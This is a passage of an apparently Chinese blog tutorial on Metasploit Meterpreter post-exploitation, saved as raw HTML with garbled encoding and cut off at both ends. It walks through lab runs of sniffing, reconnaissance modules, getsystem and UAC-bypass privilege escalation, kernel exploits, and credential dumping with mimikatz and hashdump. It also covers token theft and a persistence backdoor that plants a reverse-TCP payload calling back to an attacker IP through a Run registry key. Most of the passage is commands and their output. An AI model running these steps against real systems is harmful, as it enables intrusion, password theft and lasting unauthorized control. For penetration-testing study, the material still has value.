class="line">sniffer_start 2   #é€‰æ‹©ç½‘å¡ å¼€å§‹æŠ“åŒ…</span><br><span class="line">sniffer_stats 2   #æŸ¥çœ‹çŠ¶æ€</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #å¯¼å‡ºpcapæ•°æ®åŒ…</span><br><span class="line">sniffer_stop 2   #åœæ­¢æŠ“åŒ…</span><br></pre></td></tr></table></figure><h3 id="4-4-ä¿¡æ¯æ”¶é›†-5"><a href="#4-4-ä¿¡æ¯æ”¶é›†-5" class="headerlink" title="4.4 ä¿¡æ¯æ”¶é›†"></a>4.4 ä¿¡æ¯æ”¶é›†</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># ä¿¡æ¯æ”¶é›†çš„è„šæœ¬ä½äºï¼š</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># ä»¥ä¸‹åˆ—ä¸¾ä¸€äº›å¸¸ç”¨çš„</span><br><span class="line">run post/windows/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº</span><br><span class="line">run post/linux/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº</span><br><span class="line">run post/windows/gather/forensics/enum_drives #æŸ¥çœ‹åˆ†åŒº</span><br><span class="line">run post/windows/gather/enum_applications #è·å–å®‰è£…è½¯ä»¶ä¿¡æ¯</span><br><span class="line">run post/windows/gather/dumplinks   #è·å–æœ€è¿‘çš„æ–‡ä»¶æ“ä½œ</span><br><span class="line">run post/windows/gather/enum_ie  #è·å–IEç¼“å­˜</span><br><span class="line">run post/windows/gather/enum_chrome   #è·å–Chromeç¼“å­˜</span><br><span class="line">run post/windows/gather/enum_patches  #è¡¥ä¸ä¿¡æ¯</span><br><span class="line">run post/windows/gather/enum_domain  #æŸ¥æ‰¾åŸŸæ§</span><br></pre></td></tr></table></figure><h3 id="4-5-ææƒ-5"><a href="#4-5-ææƒ-5" class="headerlink" title="4.5 ææƒ"></a>4.5 ææƒ</h3>1.getsystemææƒ<br>getsystemå·¥ä½œåŸç†ï¼š<br>â‘ getsystemåˆ›å»ºä¸€ä¸ªæ–°çš„WindowsæœåŠ¡ï¼Œè®¾ç½®ä¸ºSYSTEMè¿è¡Œï¼Œå½“å®ƒå¯åŠ¨æ—¶è¿æ¥åˆ°ä¸€ä¸ªå‘½åç®¡é“ã€‚<br>â‘¡getsystemäº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªå‘½åç®¡é“å¹¶ç­‰å¾…æ¥è‡ªè¯¥æœåŠ¡çš„è¿æ¥ã€‚<br>â‘¢WindowsæœåŠ¡å·²å¯åŠ¨ï¼Œå¯¼è‡´ä¸å‘½åç®¡é“å»ºç«‹è¿æ¥ã€‚<br>â‘£è¯¥è¿›ç¨‹æ¥æ”¶è¿æ¥å¹¶è°ƒç”¨ImpersonateNamedPipeClientï¼Œä»è€Œä¸ºSYSTEMç”¨æˆ·åˆ›å»ºæ¨¡æ‹Ÿä»¤ç‰Œã€‚<br>ç„¶åç”¨æ–°æ”¶é›†çš„SYSTEMæ¨¡æ‹Ÿä»¤ç‰Œäº§ç”Ÿcmd.exeï¼Œå¹¶ä¸”æˆ‘ä»¬æœ‰ä¸€ä¸ªSYSTEMç‰¹æƒè¿›ç¨‹ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>2.bypassuac<br>ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼ˆUACï¼‰æ˜¯å¾®è½¯åœ¨ Windows Vista ä»¥åç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæœ‰åŠ©äºé˜²æ­¢å¯¹ç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„æ›´æ”¹ã€‚åº”ç”¨ç¨‹åºå’Œä»»åŠ¡å¯å§‹ç»ˆåœ¨éç®¡ç†å‘˜å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œé™¤éç®¡ç†å‘˜ä¸“é—¨ç»™ç³»ç»Ÿæˆäºˆç®¡ç†å‘˜çº§åˆ«çš„è®¿é—®æƒé™ã€‚UAC å¯ä»¥é˜»æ­¢æœªç»æˆæƒçš„åº”ç”¨ç¨‹åºè¿›è¡Œè‡ªåŠ¨å®‰è£…ï¼Œå¹¶é˜²æ­¢æ— æ„ä¸­æ›´æ”¹ç³»ç»Ÿè®¾ç½®ã€‚msfæä¾›äº†å¦‚ä¸‹å‡ ä¸ªæ¨¡å—å¸®åŠ©ç»•è¿‡UACï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>ä½¿ç”¨æ–¹æ³•ç±»ä¼¼ï¼Œè¿è¡Œåè¿”å›ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œ<strong>éœ€è¦å†æ¬¡æ‰§è¡Œgetsystemè·å–ç³»ç»Ÿæƒé™</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># ç„¶åè¿”å›æ–°çš„meterpreterä¼šè¯ï¼Œç»§ç»­æ‰§è¡Œgetsystemæœ¬åº”è¯¥ä¼šææƒæˆåŠŸ</span><br><span class="line"># ç„¶é¹…è¿™é‡Œå¤±è´¥äº†</span><br></pre></td></tr></table></figure>3.å†…æ ¸æ¼æ´ææƒæ— è®ºæ˜¯linuxè¿˜æ˜¯windowséƒ½å‡ºè¿‡å¾ˆå¤šé«˜å±çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä»¬è¿›è¡Œæƒé™æå‡ï¼Œæ¯”å¦‚windowsç³»ç»Ÿçš„ms13-081ã€ms15-051ã€ms16-032ã€ms17-010ç­‰ï¼Œmsfä¹Ÿé›†æˆäº†è¿™äº›æ¼æ´çš„åˆ©ç”¨æ¨¡å—ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># ç„¶é¹…å¤±è´¥äº†ï¼Œæ‘¸æ‘¸å¤´</span><br></pre></td></tr></table></figure><h3 id="4-6-è·å–å‡­è¯-5"><a href="#4-6-è·å–å‡­è¯-5" class="headerlink" title="4.6 è·å–å‡­è¯"></a>4.6 è·å–å‡­è¯</h3>åœ¨å†…ç½‘ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªç®¡ç†å‘˜å¯èƒ½ç®¡ç†å¤šå°æœåŠ¡å™¨ï¼Œä»–ä½¿ç”¨çš„å¯†ç æœ‰å¯èƒ½ç›¸åŒæˆ–è€…æœ‰è§„å¾‹ï¼Œå¦‚æœèƒ½å¤Ÿå¾—åˆ°å¯†ç æˆ–è€…hashï¼Œå†å°è¯•ç™»å½•å†…ç½‘å…¶å®ƒæœåŠ¡å™¨ï¼Œå¯èƒ½å–å¾—æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚1.ä½¿ç”¨mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">wdigest  #è·å–Wdigestå¯†ç </span><br><span class="line">mimikatz_command -f samdump::hashes  #æ‰§è¡ŒmimikatzåŸå§‹å‘½ä»¤</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) ï¿½İ¿ï¿½ </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure><ol><li>ä½¿ç”¨meterpreterçš„run hashdumpå‘½ä»¤</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>3.post/windows/gather/smart_hashdumpä»ä¸Šé¢ä¹Ÿå¯ä»¥çœ‹å‡ºå®˜æ–¹æ¨è<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>4.powerdump<br>åŒ hashdumpï¼Œä½†å¤±è´¥äº†<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h3 id="4-7-å‡å†’ä»¤ç‰Œ-5"><a href="#4-7-å‡å†’ä»¤ç‰Œ-5" class="headerlink" title="4.7 å‡å†’ä»¤ç‰Œ"></a>4.7 å‡å†’ä»¤ç‰Œ</h3>åœ¨ç”¨æˆ·ç™»å½•windowsæ“ä½œç³»ç»Ÿæ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šç»™ç”¨æˆ·åˆ†é…ä¸€ä¸ªä»¤ç‰Œ(Token)ï¼Œå½“ç”¨æˆ·è®¿é—®ç³»ç»Ÿèµ„æºæ—¶éƒ½ä¼šä½¿ç”¨è¿™ä¸ªä»¤ç‰Œè¿›è¡Œèº«ä»½éªŒè¯ï¼ŒåŠŸèƒ½ç±»ä¼¼äºç½‘ç«™çš„sessionæˆ–è€…cookieã€‚msfæä¾›äº†ä¸€ä¸ªåŠŸèƒ½æ¨¡å—å¯ä»¥è®©æˆ‘ä»¬å‡å†’åˆ«äººçš„ä»¤ç‰Œï¼Œå®ç°èº«ä»½åˆ‡æ¢ï¼Œå¦‚æœç›®æ ‡ç¯å¢ƒæ˜¯åŸŸç¯å¢ƒï¼Œåˆšå¥½åŸŸç®¡ç†å‘˜ç™»å½•è¿‡æˆ‘ä»¬å·²ç»æœ‰æƒé™çš„ç»ˆç«¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‡å†’æˆåŸŸç®¡ç†å‘˜çš„è§’è‰²ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognitoå‡å†’ä»¤ç‰Œ</span><br><span class="line">use incognito      #help incognito  æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">list_tokens -u    #æŸ¥çœ‹å¯ç”¨çš„token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #å‡å†’SYSTEM token</span><br><span class="line">æˆ–è€…impersonate_token NT\ AUTHORITY\\SYSTEM #ä¸åŠ å•å¼•å· éœ€ä½¿ç”¨\\</span><br><span class="line">execute -f cmd.exe -i â€“t    # -t ä½¿ç”¨å‡å†’çš„token æ‰§è¡Œ</span><br><span class="line">æˆ–è€…ç›´æ¥shell</span><br><span class="line">rev2self   #è¿”å›åŸå§‹token</span><br><span class="line"></span><br><span class="line"># 2.steal_tokençªƒå–ä»¤ç‰Œ</span><br><span class="line">steal_token &lt;pidå€¼&gt;   #ä»æŒ‡å®šè¿›ç¨‹ä¸­çªƒå–token   å…ˆps</span><br><span class="line">drop_token  #åˆ é™¤çªƒå–çš„token</span><br></pre></td></tr></table></figure><h3 id="4-8-æ¤å…¥åé—¨-5"><a href="#4-8-æ¤å…¥åé—¨-5" class="headerlink" title="4.8 æ¤å…¥åé—¨"></a>4.8 æ¤å…¥åé—¨</h3>Meterpreterä»…ä»…æ˜¯åœ¨å†…å­˜ä¸­é©»ç•™çš„Shellcodeï¼Œåªè¦ç›®æ ‡æœºå™¨é‡å¯å°±ä¼šä¸§å¤±æ§åˆ¶æƒï¼Œä¸‹é¢å°±ä»‹ç»å¦‚ä½•æ¤å…¥åé—¨ï¼Œç»´æŒæ§åˆ¶ã€‚1.persistenceå¯åŠ¨é¡¹åé—¨è·¯å¾„ï¼šmetasploit/scripts/meterpreter/persistenceåŸç†æ˜¯åœ¨<code>C:\Users***\AppData\Local\Temp\</code>ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬ï¼Œåœ¨æ³¨å†Œè¡¨<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ï¼Œ<strong>å¾ˆå®¹æ˜“è¢«æ€è½¯æ‹¦æˆªï¼Œå®˜æ–¹ä¸æ¨è</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence â€“h  #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-XæŒ‡å®šå¯åŠ¨çš„æ–¹å¼ä¸ºå¼€æœºè‡ªå¯åŠ¨ï¼Œ-iåå‘è¿æ¥çš„æ—¶é—´é—´éš”(5s) â€“r æŒ‡å®šæ”»å‡»è€…çš„ip</span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>èƒ½å®ç°åŒæ ·åŠŸèƒ½çš„è„šæœ¬è¿˜æœ‰ï¼šexploit/windows/local/persistence2.metsvcæœåŠ¡åé—¨åœ¨C:\Users<em><strong>\AppData\Local\Temp\ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬<br>åœ¨æ³¨å†Œè¡¨HKLM\Software\Microsoft\Windows\CurrentVersion\Run\åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ã€‚</strong>é€šè¿‡æœåŠ¡å¯åŠ¨ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå®˜æ–¹ä¸æ¨èä½¿ç”¨ï¼Œè¿è¡Œå¤±è´¥</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 